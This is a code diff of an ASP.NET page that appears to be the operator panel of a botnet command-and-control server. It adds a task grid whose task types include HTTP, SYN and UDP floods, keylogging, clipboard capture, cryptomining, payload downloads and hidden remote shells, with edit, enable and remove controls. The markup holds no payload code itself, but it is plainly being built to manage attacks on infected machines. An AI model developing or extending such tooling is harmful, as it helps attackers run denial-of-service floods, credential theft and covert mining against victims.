@@ -171,7 +171,7 @@
                     <asp:Label ID="lblDropdown" runat="server" Text="Task"></asp:Label>
                             </td>
                             <td>
-                    <asp:DropDownList ID="ddTask" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid" Height="35px" Width="260px" SelectedIndexChanged="ddTask_SelectedIndexChanged">
+                    <asp:DropDownList ID="ddTask" runat="server" AppendDataBoundItems="True" DataTextField="name" DataValueField="divisionid" Height="35px" Width="260px">
                         <asp:ListItem Value="0" disabled selected hidden >Nothing selected</asp:ListItem>
                         <asp:ListItem Value="clipboard">Clipboard Manager</asp:ListItem>
                         <asp:ListItem Value="http">HTTP Flood</asp:ListItem>
@@ -211,15 +211,111 @@
                         <tr>
                             <td class="auto-style2">&nbsp;</td>
                             <td>
-                    <asp:Button ID="btnSubmit" runat="server" Text="SUBMIT" />
+                    <asp:Button ID="btnSubmit" runat="server" Text="SUBMIT" OnClick="btnSubmit_Click" />
                             </td>
                         </tr>
                     </table>
                     <br />
+                    <asp:Label ID="lblError" runat="server" Text=""></asp:Label>
                     <br />
                     <br />
                     <div class="Grid">
-                        <asp:GridView cssClass="grdTask" ID="grdTask" runat="server" onrowdatabound="grdTask_RowDataBound">
+                        <asp:GridView cssClass="grdTask" ID="grdTask" runat="server" onrowdatabound="grdTask_RowDataBound" AutoGenerateColumns="False" style="margin-right: 0px" OnRowDeleting="grdTask_RowDeleting" Width="1563px" OnRowCancelingEdit="grdTask_RowCancelingEdit" OnRowEditing="grdTask_RowEditing" OnRowUpdating="grdTask_RowUpdating">
+                            <Columns>
+                                <asp:TemplateField HeaderText="NO.">
+                                    <EditItemTemplate>
+                                        <asp:Label ID="lblTaskID" runat="server" Text='<%# Eval("TaskID") %>'></asp:Label>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblTaskID" runat="server" Text='<%# Eval("TaskID") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="TYPE">
+                                    <EditItemTemplate>
+                                        <asp:DropDownList ID="DropDownList2" runat="server" Height="22px" Width="120px" SelectedValue='<%# Eval("Type") %>'>
+                                            <asp:ListItem Value="clipboard">Clipboard</asp:ListItem>
+                                            <asp:ListItem Value="http">HTTP</asp:ListItem>
+                                            <asp:ListItem Value="syn">SYN</asp:ListItem>
+                                            <asp:ListItem Value="udp">UDP</asp:ListItem>
+                                            <asp:ListItem Value="download">Download</asp:ListItem>
+                                            <asp:ListItem Value="firefox">Firefox</asp:ListItem>
+                                            <asp:ListItem Value="homepage">Homepage</asp:ListItem>
+                                            <asp:ListItem Value="keylogger">Keylogger</asp:ListItem>
+                                            <asp:ListItem Value="mine">Mine</asp:ListItem>
+                                            <asp:ListItem Value="cleanse">Cleanse</asp:ListItem>
+                                            <asp:ListItem Value="update">Update</asp:ListItem>
+                                            <asp:ListItem Value="uninstall">Unistall</asp:ListItem>
+                                            <asp:ListItem Value="viewhidden">View Hidden</asp:ListItem>
+                                            <asp:ListItem Value="viewvisable">View Visable</asp:ListItem>
+                                            <asp:ListItem Value="shellhidden">Shell Hidden</asp:ListItem>
+                                            <asp:ListItem Value="shellvisable">Shell Visable</asp:ListItem>
+                                        </asp:DropDownList>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblType" runat="server" Text='<%# Eval("Type") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="PARAMETER 1">
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblParameter1" runat="server" Text='<%# Eval("Parameter1") %>'></asp:Label>
+                                    </ItemTemplate>
+                                    <EditItemTemplate>
+                                        <asp:TextBox ID="txtParameter1" runat="server" Height="15px" Width="100px" Text='<%# Eval("Parameter1") %>'></asp:TextBox>
+                                    </EditItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="PARAMETER 2">
+                                    <EditItemTemplate>
+                                        <asp:TextBox ID="txtParameter2" runat="server" Height="15px" Width="100px" Text='<%# Eval("Parameter2") %>'></asp:TextBox>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblParameter2" runat="server" Text='<%# Eval("Parameter2") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="PARAMETER 3">
+                                    <EditItemTemplate>
+                                        <asp:TextBox ID="txtParameter3" runat="server" Height="15px" Width="100px" Text='<%# Eval("Parameter3") %>'></asp:TextBox>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblParameter3" runat="server" Text='<%# Eval("Parameter3") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="PARAMETER 4">
+                                    <EditItemTemplate>
+                                        <asp:TextBox ID="txtParameter4" runat="server" Height="15px" Width="100px" Text='<%# Eval("Parameter4") %>'></asp:TextBox>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblParameter4" runat="server" Text='<%# Eval("Parameter4") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="MAX AMOUNT">
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblMax" runat="server" Text='<%# Eval("Max") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="RUNNING AMOUNT">
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblRunning" runat="server" Text='<%# Eval("Ran") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="FILTER">
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblFilter" runat="server" Text='<%# Eval("Filter") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:TemplateField HeaderText="STATUS">
+                                    <EditItemTemplate>
+                                        <asp:DropDownList ID="DropDownList1" runat="server" SelectedValue='<%# Eval("Status") %>'>
+                                            <asp:ListItem>Enabled</asp:ListItem>
+                                            <asp:ListItem>Disabled</asp:ListItem>
+                                        </asp:DropDownList>
+                                    </EditItemTemplate>
+                                    <ItemTemplate>
+                                        <asp:Label ID="lblStatus" runat="server" Text='<%# Eval("Status") %>'></asp:Label>
+                                    </ItemTemplate>
+                                </asp:TemplateField>
+                                <asp:CommandField CancelText="Cancel" EditText="Change state" ShowEditButton="True" UpdateText="Update           " />
+                                <asp:CommandField DeleteText="Remove Task" HeaderText="OPTIONS" ShowDeleteButton="True" />
+                            </Columns>
                         </asp:GridView>
                     </div>
                 </div>
